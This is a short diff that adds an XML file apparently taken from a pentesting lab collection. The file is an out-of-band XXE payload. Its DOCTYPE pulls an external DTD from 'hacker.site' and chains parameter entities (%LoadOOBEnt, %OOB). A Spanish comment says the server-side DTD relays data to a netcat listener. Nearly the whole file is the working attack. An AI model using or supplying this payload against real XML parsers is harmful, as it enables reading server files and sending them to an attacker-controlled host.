@@ -1,0 +1,13 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+	<!ENTITY % EvilDTD SYSTEM "http://hacker.site/XML/XXE/XXE_serverside.dtd">
+	%EvilDTD;
+	%LoadOOBEnt;
+	%OOB;
+]>
+
+<message>
+	<body>ola brother</body>
+</message>
+
+<!-------Esto conecta con el .dtd que tenemos en el server, y este conecta con el netcat o lo que tengamos escuchando----->
